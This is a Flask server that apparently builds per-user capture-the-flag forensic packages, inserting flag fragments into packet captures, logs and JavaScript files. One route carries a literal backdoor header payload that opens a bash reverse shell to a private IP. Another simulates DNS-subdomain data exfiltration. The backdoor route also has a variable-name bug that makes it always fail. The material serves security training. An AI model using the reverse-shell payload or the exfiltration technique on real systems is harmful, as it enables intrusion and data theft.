from flask import Flask, request, jsonify, render_template, Response
from flask_cors import CORS
import requests
import os
import json
import tempfile
import subprocess
import zipfile
import shutil
import math
import random
import base64
import pandas as pd
from datetime import datetime, timedelta
from scapy.all import IP, UDP, DNS, DNSQR, wrpcap, rdpcap, Raw, TCP

app = Flask(__name__)
CORS(app)

# Base directory setup
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CHALLENGES_DIR = os.path.join(BASE_DIR, 'challenges')

# Challenge IDs
CTF_BASE_URL = "https://ctf.cybersuraksha.co"
deepDivechallenge_id = "683fe143c6d6c84d40c6fc3f" 
chatgpt_challenge_id = "6841aacfc6d6c84d40c72da7"
challenge_id = "682c3e5b088e4ef9fb77763f"
procnet_challenge_id = "68402692c6d6c84d40c70bc0" 
aiChallenge_id = "68414798c6d6c84d40c7247d" 
backDoor_id = "6845bbe19d3ac335c86a30d2" 
springBoot_id = "684679669d3ac335c86a44cf" 
ShadowsInTheWeb_id = "6845f3779d3ac335c86a3176" 
AiEvasion_id = "68467ad99d3ac335c86a4b1d" 

# Path configurations for each challenge
CHALLENGE_PATHS = {
    'pcapdeepdive': {
        'excel_path': os.path.join(CHALLENGES_DIR, 'pcapdeepdive', 'deepdive_map.xlsx'),
        'pcap_path': os.path.join(CHALLENGES_DIR, 'pcapdeepdive', 'PcapDeepDive.pcap'),
        'original_url': b"110.81.92.57"
    },
    'chatgpt': {
        'js_path': os.path.join(CHALLENGES_DIR, 'chatgpt', 'input.js'),
        'json_path': os.path.join(CHALLENGES_DIR, 'chatgpt', 'manifest.json'),
        'placeholder_map': {
            "flag{th1s_": 0,
            "1s_mult1": 1,
            "auth=stage_ct": 2,
            "f_ch4ll3": 3,
            "ng3_fin4": 4,
            "l_f1nd_m3}": 5
        }
    },
    'procnet': {
        'pcap_path': os.path.join(CHALLENGES_DIR, 'procnet', 'Employee_edited.pcap')
    },
    'aichallenge': {
        'log_path': os.path.join(CHALLENGES_DIR, 'aichallenge', 'ai_detection_log.json'),
        'whitelist_path': os.path.join(CHALLENGES_DIR, 'aichallenge', 'corporate_whitelist.txt')
    },
    'Backdoor':{
        'pcap_path': os.path.join(CHALLENGES_DIR, 'Backdoor', 'output.pcap'),
         'log_file': os.path.join(CHALLENGES_DIR, 'Backdoor', 'access.log'),

    },
     'SpringBoot':{
        'pcap_path': os.path.join(CHALLENGES_DIR, 'SpringBoot', 'output.pcap'),
         'log_file': os.path.join(CHALLENGES_DIR, 'SpringBoot', 'access.log'),

    },
     'ShadowsInTheWeb':{
        'access_file': os.path.join(CHALLENGES_DIR, 'ShadowsInTheWeb', 'access.log'),
        'auth_file': os.path.join(CHALLENGES_DIR, 'ShadowsInTheWeb', 'auth.log'),
        'error_file': os.path.join(CHALLENGES_DIR, 'ShadowsInTheWeb', 'error.log'),

    },
     'AiEvasion':{
        'blocker_file': os.path.join(CHALLENGES_DIR, 'AiEvasion', 'blocker.py'),
        'config_file': os.path.join(CHALLENGES_DIR, 'AiEvasion', 'config.json'),
        'malware_file': os.path.join(CHALLENGES_DIR, 'AiEvasion', 'malware.js'),
        'obfuscated_file': os.path.join(CHALLENGES_DIR, 'AiEvasion', 'obfuscated.js'),
        'edrLog_file': os.path.join(CHALLENGES_DIR, 'AiEvasion', 'edr_logs.json'),
    }

}

# Common functions
def split_flag_into_6_parts(flag):
    total_len = len(flag)
    if total_len < 6:
        raise ValueError("Flag must be at least 6 characters long.")
    base_size = total_len // 6
    extras = total_len % 6
    parts = []
    start = 0
    for i in range(6):
        size = base_size + (1 if i < extras else 0)
        parts.append(flag[start:start + size])
        start += size
    return parts

def split_flag(flag):
    """Split flag into three roughly equal parts"""
    length = len(flag)
    part1_end = math.ceil(length / 3)
    part2_end = math.ceil(2 * length / 3)
    return [
        flag[:part1_end],
        flag[part1_end:part2_end],
        flag[part2_end:]
    ]

# Routes
@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def index(path):
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def proxy_login():
    try:
        data = request.json
        res = requests.post(
            f"{CTF_BASE_URL}/api/auth/login",
            json=data
        )
        return jsonify(res.json()), res.status_code
    except Exception as e:
        return jsonify({"error": "Login failed", "details": str(e)}), 500

@app.route('/get_pcap', methods=['POST'])
def get_pcap():
    # Configure these paths according to your system
    EDITCAP_PATH = "C:\\Program Files\\Wireshark\\editcap.exe"
    TSHARK_PATH = "C:\\Program Files\\Wireshark\\tshark.exe"
    PCAP_DRIVE_URL = 'https://drive.google.com/uc?export=download&id=1PSp_FffozmdlxArjDyPFuaK-HMqK6D7u'
    TXT_TEMPLATE_URL = 'https://drive.google.com/uc?export=download&id=1c4oGgR-T8KwlYbva_eR_0powWip8Lw5n'

    data = request.json
    token = data.get("token")

    if not token or not challenge_id:
        return jsonify({"error": "Missing token or challenge ID"}), 400

    try:
        headers = {"Auth-token": token}
        flag_response = requests.get(
            f"{CTF_BASE_URL}/api/challenges/get-flag/{challenge_id}",
            headers=headers
        )
        
        if flag_response.status_code != 200:
            return jsonify({"error": "Failed to get flag", "status": flag_response.status_code}), flag_response.status_code
        
        flag_data = flag_response.json()
        flag = flag_data['flag']
        username = flag_data['username']
        flag_parts = split_flag(flag)

        temp_dir = tempfile.mkdtemp()
        original_pcap = os.path.join(temp_dir, 'original.pcap')
        modified_pcap = os.path.join(temp_dir, f'{username}.pcap')
        txt_file = os.path.join(temp_dir, f'{username}.txt')
        zip_file = os.path.join(temp_dir, 'challenge.zip')

        pcap_response = requests.get(PCAP_DRIVE_URL)
        with open(original_pcap, 'wb') as f:
            f.write(pcap_response.content)

        subprocess.run([
            EDITCAP_PATH,
            '-a', f'2:{flag_parts[0]}',
            '-a', f'5:{flag_parts[1]}',
            '-a', f'6:{flag_parts[2]}',
            original_pcap,
            modified_pcap
        ], check=True)

        txt_response = requests.get(TXT_TEMPLATE_URL)
        with open(txt_file, 'wb') as f:
            f.write(txt_response.content)

        with zipfile.ZipFile(zip_file, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(modified_pcap, arcname=f'{username}.pcap')
            zipf.write(txt_file, arcname=f'{username}.txt')

        def generate():
            with open(zip_file, 'rb') as f:
                while chunk := f.read(1024):
                    yield chunk
            shutil.rmtree(temp_dir)

        return Response(
            generate(),
            mimetype='application/zip',
            headers={
                'Content-Disposition': f'attachment; filename="challenge_{username}.zip"'
            }
        )

    except subprocess.CalledProcessError as e:
        return jsonify({"error": "PCAP processing failed", "details": str(e)}), 500
    except Exception as e:
        return jsonify({"error": "Something went wrong", "details": str(e)}), 500

@app.route('/pcapdeepdive', methods=['POST'])
def pcap_deep_dive():
    data = request.json
    token = data.get("token")

    if not token:
        return jsonify({"error": "Missing token"}), 400

    try:
        headers = {"Auth-token": token}
        response = requests.get(
            f"{CTF_BASE_URL}/api/challenges/get-flag/{deepDivechallenge_id}",
            headers=headers
        )
        if response.status_code != 200:
            return jsonify({"error": "Failed to get flag"}), response.status_code

        flag_data = response.json()
        flag = flag_data['flag']
        username = flag_data['username']

        df = pd.read_excel(CHALLENGE_PATHS['pcapdeepdive']['excel_path'], header=None)
        match = df[df[0] == flag]
        if match.empty:
            return jsonify({"error": "Flag not found in Excel sheet"}), 404

        replacement_url = match.iloc[0, 2].encode()
        temp_dir = tempfile.mkdtemp()
        output_pcap = os.path.join(temp_dir, f"{username}.pcap")
        zip_path = os.path.join(temp_dir, f"{username}.zip")

        packets = rdpcap(CHALLENGE_PATHS['pcapdeepdive']['pcap_path'])
        target_index = -1

        for i, pkt in enumerate(packets):
            if Raw in pkt and CHALLENGE_PATHS['pcapdeepdive']['original_url'] in pkt[Raw].load:
                target_index = i
                original_payload = pkt[Raw].load
                modified_payload = original_payload.replace(
                    CHALLENGE_PATHS['pcapdeepdive']['original_url'], 
                    replacement_url
                )
                pkt[Raw].load = modified_payload
                break

        if target_index == -1:
            shutil.rmtree(temp_dir)
            return jsonify({"error": "No packet found with the specified URL"}), 404

        wrpcap(output_pcap, packets)

        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(output_pcap, arcname=f"{username}.pcap")

        def generate():
            with open(zip_path, 'rb') as f:
                while chunk := f.read(1024):
                    yield chunk
            shutil.rmtree(temp_dir)

        return Response(
            generate(),
            mimetype='application/zip',
            headers={'Content-Disposition': f'attachment; filename="{username}.zip"'}
        )

    except Exception as e:
        return jsonify({"error": "Processing failed", "details": str(e)}), 500

@app.route('/chatgptchallenge', methods=['POST'])
def chatgpt_challenge():
    try:
        data = request.json
        token = data.get("token")
        if not token:
            return jsonify({"error": "Missing token"}), 400

        headers = { "Auth-token": token }
        res = requests.get(f"{CTF_BASE_URL}/api/challenges/get-flag/{chatgpt_challenge_id}", headers=headers)

        if res.status_code != 200:
            return jsonify({"error": "Failed to get flag"}), res.status_code

        res_data = res.json()
        flag = res_data["flag"]
        username = res_data["username"]
        flag_parts = split_flag_into_6_parts(flag)

        with open(CHALLENGE_PATHS['chatgpt']['js_path'], "r", encoding="utf-8") as f:
            js_code = f.read()

        for placeholder, index in CHALLENGE_PATHS['chatgpt']['placeholder_map'].items():
            if placeholder in js_code:
                js_code = js_code.replace(placeholder, flag_parts[index])
            else:
                print(f"⚠ Warning: Placeholder '{placeholder}' not found in JS")

        temp_dir = tempfile.mkdtemp()
        output_js_path = os.path.join(temp_dir, f"{username}.js")
        zip_path = os.path.join(temp_dir, f"{username}_challenge.zip")

        with open(output_js_path, "w", encoding="utf-8") as f:
            f.write(js_code)

        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(output_js_path, arcname=f"{username}.js")
            zipf.write(CHALLENGE_PATHS['chatgpt']['json_path'], arcname=f"{username}.json")

        def generate():
            with open(zip_path, 'rb') as f:
                while chunk := f.read(1024):
                    yield chunk
            shutil.rmtree(temp_dir)

        return Response(
            generate(),
            mimetype='application/zip',
            headers={'Content-Disposition': f'attachment; filename="{username}_challenge.zip"'}
        )

    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/procnetchallenge', methods=['POST'])
def procnet_challenge():
    data = request.json
    token = data.get("token")

    if not token:
        return jsonify({"error": "Missing token"}), 400

    try:
        headers = {"Auth-token": token}
        flag_response = requests.get(f"{CTF_BASE_URL}/api/challenges/get-flag/{procnet_challenge_id}", headers=headers)
        if flag_response.status_code != 200:
            return jsonify({"error": "Failed to fetch flag"}), flag_response.status_code

        flag_data = flag_response.json()
        flag_full = flag_data['flag']
        username = flag_data['username']
        userflag = flag_full.split('{')[1].split('_')[0]
        new_session_id = f"{userflag}"

        temp_dir = tempfile.mkdtemp()
        input_pcap = os.path.join(temp_dir, "Employee_edited.pcap")
        output_pcap = os.path.join(temp_dir, f"{username}.pcap")
        zip_file = os.path.join(temp_dir, 'challenge.zip')

        shutil.copy(CHALLENGE_PATHS['procnet']['pcap_path'], input_pcap)

        from scapy.all import rdpcap, wrpcap, IP, TCP, Raw
        packets = rdpcap(input_pcap)
        modified_packets = packets[:]
        TARGET_PACKET_NUMBER = 18487
        SRC_IP = "8.71.0.169"
        DST_IP = "6.92.79.1"

        def is_tls_client_hello(payload):
            return payload.startswith(b'\x16\x03') and payload[5] == 0x01

        for i, pkt in enumerate(packets):
            if i != TARGET_PACKET_NUMBER - 1:
                continue

            if IP in pkt and pkt[IP].src == SRC_IP and pkt[IP].dst == DST_IP and TCP in pkt and pkt[TCP].dport != 8080:
                if Raw in pkt:
                    payload = pkt[Raw].load
                    if is_tls_client_hello(payload):
                        sid_len_offset = 43
                        sid_len = payload[sid_len_offset]
                        sid_start = sid_len_offset + 1
                        sid_end = sid_start + sid_len

                        new_sid_bytes = new_session_id.encode('utf-8')
                        padded_sid = new_sid_bytes.ljust(sid_len, b'\x00')[:sid_len]

                        modified_payload = payload[:sid_start] + padded_sid + payload[sid_end:]
                        modified_packets[i][Raw].load = modified_payload
                        break

        wrpcap(output_pcap, modified_packets)

        with zipfile.ZipFile(zip_file, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(output_pcap, arcname=f'{username}.pcap')

        def generate():
            with open(zip_file, 'rb') as f:
                while chunk := f.read(1024):
                    yield chunk
            shutil.rmtree(temp_dir)

        return Response(
            generate(),
            mimetype='application/zip',
            headers={'Content-Disposition': f'attachment; filename="challenge_{username}.zip"'}
        )

    except Exception as e:
        return jsonify({"error": "Processing failed", "details": str(e)}), 500

@app.route('/aichallenge', methods=['POST'])
def ai_challenge():
    data = request.json
    token = data.get("token")

    if not token:
        return jsonify({"error": "Missing token"}), 400

    try:
        headers = {"Auth-token": token}
        response = requests.get(
            f"{CTF_BASE_URL}/api/challenges/get-flag/{aiChallenge_id}",
            headers=headers
        )

        if response.status_code != 200:
            return jsonify({"error": "Failed to get flag"}), response.status_code

        flag_data = response.json()
        flag = flag_data['flag']
        username = flag_data['username']

        try:
            dynamic_flag = flag.split("employee_records_")[1].rstrip("}")
        except Exception:
            return jsonify({"error": "Invalid flag format"}), 400

        temp_dir = tempfile.mkdtemp()
        output_pcap = os.path.join(temp_dir, f"{username}.pcap")
        zip_path = os.path.join(temp_dir, f"{username}.zip")

        def encode_data_to_subdomains(data, dynamic_flag):
            full_payload = f"{data}_{dynamic_flag}"
            encoded = base64.b32encode(full_payload.encode()).decode().rstrip('=')
            chunks = [encoded[i:i+8].ljust(8, '=') for i in range(0, len(encoded), 8)]
            return chunks

        def generate_legit_dns(start_time, hours=24):
            packets = []
            current_time = start_time
            domains = [
                "office365.com", "microsoft.com", "windows.com", "azure.com",
                "amazonaws.com", "github.com", "stackoverflow.com", "google.com",
                "linkedin.com", "slack.com", "zoom.us", "teams.microsoft.com"
            ]
            dns_servers = ["8.8.8.8", "1.1.1.1", "208.67.222.222"]
            for hour in range(hours):
                for _ in range(random.randint(20, 40)):
                    domain = random.choice(domains)
                    server = random.choice(dns_servers)
                    pkt = IP(src="10.30.50.125", dst=server)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=domain))
                    packets.append(pkt)
                current_time += timedelta(hours=1)
            return packets

        def generate_malicious_dns(start_time, dynamic_flag):
            exfil_data = "employee_records"
            chunks = encode_data_to_subdomains(exfil_data, dynamic_flag)
            exfil_start = start_time + timedelta(hours=6)
            dns_servers = ["8.8.8.8", "1.1.1.1"]
            packets = []

            for i, chunk in enumerate(chunks):
                malicious_domain = f"{chunk.lower()}.sys-inventory.cloudops.net"
                time_offset = exfil_start + timedelta(seconds=i * 47)
                pkt = IP(src="10.30.50.125", dst=random.choice(dns_servers))/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=malicious_domain))
                pkt.time = time_offset.timestamp()
                packets.append(pkt)

            for _ in range(3):
                noise_sub = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))
                noise_domain = f"{noise_sub}.sys-inventory.cloudops.net"
                noise_time = exfil_start + timedelta(seconds=random.randint(1800, 2100))
                pkt = IP(src="10.30.50.125", dst=random.choice(dns_servers))/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=noise_domain))
                pkt.time = noise_time.timestamp()
                packets.append(pkt)

            return packets

        start_time = datetime(2024, 11, 15, 0, 0, 0)
        legit_dns = generate_legit_dns(start_time)
        malicious_dns = generate_malicious_dns(start_time, dynamic_flag)

        all_packets = legit_dns + malicious_dns
        all_packets.sort(key=lambda p: getattr(p, 'time', 0))
        wrpcap(output_pcap, all_packets)

        shutil.copy(CHALLENGE_PATHS['aichallenge']['log_path'], os.path.join(temp_dir, "ai_detection_log.json"))
        shutil.copy(CHALLENGE_PATHS['aichallenge']['whitelist_path'], os.path.join(temp_dir, "corporate_whitelist.txt"))

        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(output_pcap, arcname=f"{username}.pcap")
            zipf.write(os.path.join(temp_dir, "ai_detection_log.json"), arcname="ai_detection_log.json")
            zipf.write(os.path.join(temp_dir, "corporate_whitelist.txt"), arcname="corporate_whitelist.txt")

        def generate():
            with open(zip_path, 'rb') as f:
                while chunk := f.read(1024):
                    yield chunk
            shutil.rmtree(temp_dir)

        return Response(
            generate(),
            mimetype='application/zip',
            headers={'Content-Disposition': f'attachment; filename="{username}.zip"'}
        )

    except Exception as e:
        return jsonify({"error": "Processing failed", "details": str(e)}), 500


@app.route('/backdoor', methods=['POST'])
def backdoor_challenge():
    data = request.json
    token = data.get("token")

    if not token:
        return jsonify({"error": "Missing token"}), 400

    try:
        headers = {"Auth-token": token}
        response = requests.get(
            f"{CTF_BASE_URL}/api/challenges/get-flag/{backDoor_id}",
            headers=headers
        )

        if response.status_code != 200:
            return jsonify({"error": "Failed to get flag"}), response.status_code

        flag_data = response.json()
        flag = flag_data['flag']
        username = flag_data['username']

        # Validate flag format
        if not flag.startswith("FLAG{") or not flag.endswith("}"):
            return jsonify({"error": "Invalid flag format"}), 400

        flag_content = flag[5:-1]
        if '_' not in flag_content:
            return jsonify({"error": "Flag missing underscore"}), 400

        part_a, part_b = flag_content.split('_', 1)
        packets = rdpcap(CHALLENGE_PATHS['Backdoor']['pcap_path'])

        found_133336 = False
        found_stream = False

        # Modify packet 133336
        pkt1 = packets[133335]
        if pkt1.haslayer(Raw):
            payload = pkt1[Raw].load
            target = b'User-Agentt: zerodiumsystem("bash -c \'bash -i >& /dev/tcp/192.168.82.128/4444 0>&1\'");\r\n'
            if target in payload:
                new_payload = target[:-2] + part_a.encode() + b'\r\n'
                pkt1[Raw].load = payload.replace(target, new_payload)
                del pkt1[IP].len, pkt1[IP].chksum, pkt1[TCP].chksum
                found_133333 = True

        # Reassemble packets 134325 and 134326
        pkt_stream = [packets[134324], packets[134325]]  # Wireshark numbers are +1
        stream_payload = b''.join(pkt[Raw].load for pkt in pkt_stream if pkt.haslayer(Raw))

        # Replace target inside stream
        target_payload = b'secret+files+api+key=098ABCD12345!\n'
        if target_payload in stream_payload:
            modified_payload = stream_payload.replace(
                target_payload,
                b'secret+files+api+key=098ABCD12345!_' + part_b.encode() + b'\n'
            )

            # Update content-length
            import re
            match = re.search(b'Content-Length: (\\d+)', modified_payload)
            if match:
                old_len = int(match.group(1))
                new_len = old_len + len(part_b.encode()) + 1
                modified_payload = re.sub(
                    b'Content-Length: \\d+',
                    b'Content-Length: ' + str(new_len).encode(),
                    modified_payload
                )

            # Now split modified payload across same two packets
            len_1 = len(pkt_stream[0][Raw].load)
            pkt_stream[0][Raw].load = modified_payload[:len_1]
            pkt_stream[1][Raw].load = modified_payload[len_1:]

            for pkt in pkt_stream:
                del pkt[IP].len, pkt[IP].chksum, pkt[TCP].chksum

            found_stream = True

        if not found_133336 or not found_stream:
            return jsonify({"error": "One or both target packets not modified"}), 400

        # Write zip
        temp_dir = tempfile.mkdtemp()
        output_pcap = os.path.join(temp_dir, f"{username}.pcap")
        log_path = CHALLENGE_PATHS['Backdoor']['log_file']
        zip_path = os.path.join(temp_dir, f"{username}.zip")

        wrpcap(output_pcap, packets)

        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(output_pcap, arcname=f"{username}.pcap")
            zipf.write(log_path, arcname="access.log")

        def generate():
            with open(zip_path, 'rb') as f:
                while chunk := f.read(1024):
                    yield chunk
            shutil.rmtree(temp_dir)

        return Response(
            generate(),
            mimetype='application/zip',
            headers={'Content-Disposition': f'attachment; filename="{username}.zip"'}
        )

    except Exception as e:
        return jsonify({"error": "Processing failed", "details": str(e)})
    

@app.route('/springboot', methods=['POST'])
def springboot_challenge():
    data = request.json
    token = data.get("token")

    if not token:
        return jsonify({"error": "Missing token"}), 400

    try:
        headers = {"Auth-token": token}
        response = requests.get(
            f"{CTF_BASE_URL}/api/challenges/get-flag/{springBoot_id}",
            headers=headers
        )

        if response.status_code != 200:
            return jsonify({"error": "Failed to get flag"}), response.status_code

        flag_data = response.json()
        flag = flag_data['flag']
        username = flag_data['username']

        if not flag.startswith("FLAG{") or not flag.endswith("}"):
            return jsonify({"error": "Invalid flag format"}), 400

        flag_content = flag[5:-1]
        if '_' not in flag_content:
            return jsonify({"error": "Flag missing underscore"}), 400

        part_a, part_b = flag_content.split('_', 1)
        packets = rdpcap(CHALLENGE_PATHS['SpringBoot']['pcap_path'])

        # Modify packet 126055 (frame index = 126054)
        pkt_a = packets[126054]
        found_a = False
        if pkt_a.haslayer(Raw):
            payload = pkt_a[Raw].load
            target = b'Namedpandaapt12H4xor!'
            if target in payload:
                new_payload = payload.replace(
                    target,
                    target + part_a.encode()
                )
                pkt_a[Raw].load = new_payload
                del pkt_a[IP].len, pkt_a[IP].chksum, pkt_a[TCP].chksum
                found_a = True

        # Modify packet 125814 (frame index = 125813)
        pkt_b = packets[125813]
        found_b = False
        if pkt_b.haslayer(Raw):
            payload = pkt_b[Raw].load
            target = b'base64'
            if target in payload:
                new_payload = payload.replace(
                    target,
                    target + b'=='+b'_' + part_b.encode()
                )
                pkt_b[Raw].load = new_payload
                del pkt_b[IP].len, pkt_b[IP].chksum, pkt_b[TCP].chksum
                found_b = True

        if not found_a or not found_b:
            return jsonify({"error": "One or both target packets not modified"}), 400

        # Create zip
        temp_dir = tempfile.mkdtemp()
        output_pcap = os.path.join(temp_dir, f"{username}.pcap")
        log_path = CHALLENGE_PATHS['SpringBoot']['log_file']
        zip_path = os.path.join(temp_dir, f"{username}.zip")

        wrpcap(output_pcap, packets)

        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(output_pcap, arcname=f"{username}.pcap")
            zipf.write(log_path, arcname="access.log")

        def generate():
            with open(zip_path, 'rb') as f:
                while chunk := f.read(1024):
                    yield chunk
            shutil.rmtree(temp_dir)

        return Response(
            generate(),
            mimetype='application/zip',
            headers={'Content-Disposition': f'attachment; filename="{username}.zip"'}
        )

    except Exception as e:
        return jsonify({"error": "Processing failed", "details": str(e)})

@app.route('/ShadowsInTheWeb', methods=['POST'])
def shadows_in_the_web_challenge():
    data = request.json
    token = data.get("token")

    if not token:
        return jsonify({"error": "Missing token"}), 400

    try:
        headers = {"Auth-token": token}
        response = requests.get(
            f"{CTF_BASE_URL}/api/challenges/get-flag/{ShadowsInTheWeb_id}",
            headers=headers
        )

        if response.status_code != 200:
            return jsonify({"error": "Failed to get flag"}), response.status_code

        flag_data = response.json()
        flag = flag_data['flag']
        username = flag_data['username']

        if not flag.startswith("FLAG{") or not flag.endswith("}"):
            return jsonify({"error": "Invalid flag format"}), 400

        flag_content = flag[5:-1]
        parts = flag_content.split('_')

        if len(parts) != 3:
            return jsonify({"error": "Flag format incorrect"}), 400

        part_a = parts[0]
        part_b = parts[2]

        # File paths
        access_path = CHALLENGE_PATHS['ShadowsInTheWeb']['access_file']
        auth_path = CHALLENGE_PATHS['ShadowsInTheWeb']['auth_file']
        error_path = CHALLENGE_PATHS['ShadowsInTheWeb']['error_file']

        # Create temp directory
        temp_dir = tempfile.mkdtemp()
        access_out = os.path.join(temp_dir, "access.log")
        auth_out = os.path.join(temp_dir, "auth.log")
        error_out = os.path.join(temp_dir, "error.log")
        zip_path = os.path.join(temp_dir, f"{username}.zip")

        # Modify and write access.log
        with open(access_path, 'r') as f_in, open(access_out, 'w') as f_out:
            content = f_in.read()
            content = content.replace("y738293.php", part_a)
            f_out.write(content)

        # Modify and write auth.log
        with open(auth_path, 'r') as f_in, open(auth_out, 'w') as f_out:
            content = f_in.read()
            content = content.replace("203.0.113.77", part_b)
            f_out.write(content)

        # Copy error.log as-is
        shutil.copy(error_path, error_out)

        # Create zip
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(access_out, arcname="access.log")
            zipf.write(auth_out, arcname="auth.log")
            zipf.write(error_out, arcname="error.log")

        def generate():
            with open(zip_path, 'rb') as f:
                while chunk := f.read(1024):
                    yield chunk
            shutil.rmtree(temp_dir)

        return Response(
            generate(),
            mimetype='application/zip',
            headers={'Content-Disposition': f'attachment; filename="{username}.zip"'}
        )

    except Exception as e:
        return jsonify({"error": "Processing failed", "details": str(e)})


@app.route('/AiEvasion', methods=['POST'])
def ai_evasion_challenge():
    data = request.json
    token = data.get("token")

    if not token:
        return jsonify({"error": "Missing token"}), 400

    try:
        headers = {"Auth-token": token}
        response = requests.get(
            f"{CTF_BASE_URL}/api/challenges/get-flag/{AiEvasion_id}",
            headers=headers
        )

        if response.status_code != 200:
            return jsonify({"error": "Failed to get flag"}), response.status_code

        flag_data = response.json()
        flag = flag_data['flag']
        username = flag_data['username']

        if not flag.startswith("FLAG{") or not flag.endswith("}"):
            return jsonify({"error": "Invalid flag format"}), 400

        flag_content = flag[5:-1]
        parts = flag_content.split('_')

        if len(parts) < 2:
            return jsonify({"error": "Flag format incorrect"}), 400

        part_a = parts[0]  # only use partA

        # Get paths
        paths = CHALLENGE_PATHS['AiEvasion']
        blocker_file = paths['blocker_file']
        config_file = paths['config_file']
        malware_file = paths['malware_file']
        obfuscated_file = paths['obfuscated_file']
        edr_file = paths['edrLog_file']

        # Temp output paths
        temp_dir = tempfile.mkdtemp()
        out_blocker = os.path.join(temp_dir, "blocker.py")
        out_config = os.path.join(temp_dir, "config.json")
        out_malware = os.path.join(temp_dir, "malware.js")
        out_obfuscated = os.path.join(temp_dir, "obfuscated.js")
        out_edr = os.path.join(temp_dir, "edr_logs.json")
        zip_path = os.path.join(temp_dir, f"{username}.zip")

        # Copy unchanged files
        shutil.copy(blocker_file, out_blocker)
        shutil.copy(config_file, out_config)
        shutil.copy(malware_file, out_malware)
        shutil.copy(obfuscated_file, out_obfuscated)

        # Process edr_logs.json
        with open(edr_file, 'r') as f:
            logs = json.load(f)

        for entry in logs:
            if entry.get("file_hash") == "8ebf0e8a7ef69e6557818e7b80708a330fd16ab709906492fa295996b6644db5":
                entry["file_hash"] = part_a

        with open(out_edr, 'w') as f:
            json.dump(logs, f, indent=4)

        # Zip all
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(out_blocker, arcname="blocker.py")
            zipf.write(out_config, arcname="config.json")
            zipf.write(out_malware, arcname="malware.js")
            zipf.write(out_obfuscated, arcname="obfuscated.js")
            zipf.write(out_edr, arcname="edr_logs.json")

        def generate():
            with open(zip_path, 'rb') as f:
                while chunk := f.read(1024):
                    yield chunk
            shutil.rmtree(temp_dir)

        return Response(
            generate(),
            mimetype='application/zip',
            headers={'Content-Disposition': f'attachment; filename="{username}.zip"'}
        )

    except Exception as e:
        return jsonify({"error": "Processing failed", "details": str(e)})


if __name__ == '__main__':
    app.run(debug=True, port=5002)